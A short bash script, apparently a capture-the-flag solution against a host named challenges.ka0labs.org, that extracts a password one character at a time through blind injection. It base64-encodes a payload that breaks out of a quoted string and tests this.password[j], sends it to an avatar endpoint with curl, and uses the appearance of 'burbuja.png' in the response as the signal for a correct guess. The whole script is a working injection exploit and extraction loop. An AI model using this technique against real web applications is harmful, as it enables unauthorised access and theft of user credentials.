#!/bin/bash

password=''
for j in {0..50};do
        echo $j
        for k in {{97..128},{65..96},{0..64}}; do

            # Ciclar por los valores de ASCII

                i=$(echo "$k" | awk '{ printf("%c", $0); }')
                #echo $i
                #echo -n $i | base64
                foo=$(echo -n "\"||this.password[$j]!=\"$i\"||\"" | base64)

                #echo -n "\"||this.password.substring($j)!=\"${i}\"||\"" | base64
                #echo $foo

                if [[ -n $(curl -s http://challenges.ka0labs.org:31337/avatar/$foo | grep burbuja.png ) ]];then
                        old="$password"
                        password="$password$i"
                        echo $i
                        #echo "ok"
                        break
                fi
        done
        [ "$old" == "$password" ] && break
done
echo password > pass.txt
echo $password


